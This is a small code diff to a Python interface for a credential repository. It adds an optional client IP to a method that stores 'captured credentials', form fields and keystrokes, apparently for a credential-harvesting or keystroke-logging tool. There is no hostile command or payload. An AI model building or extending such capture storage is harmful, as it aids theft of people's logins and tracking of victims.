@@ -5,8 +5,8 @@ class ICredentialRepository(ABC):
     """Interface for credential storage implementations"""
     
     @abstractmethod
-    def save_credentials(self, application_info: Dict, form_fields: List[Dict], keystrokes: List[Dict]) -> str:
-        """Save captured credentials and return document ID"""
+    def save_credentials(self, application_info: Dict, form_fields: List[Dict], keystrokes: List[Dict], client_ip: str = None) -> str:
+        """Save captured credentials with optional client IP and return document ID"""
         pass
     
     @abstractmethod
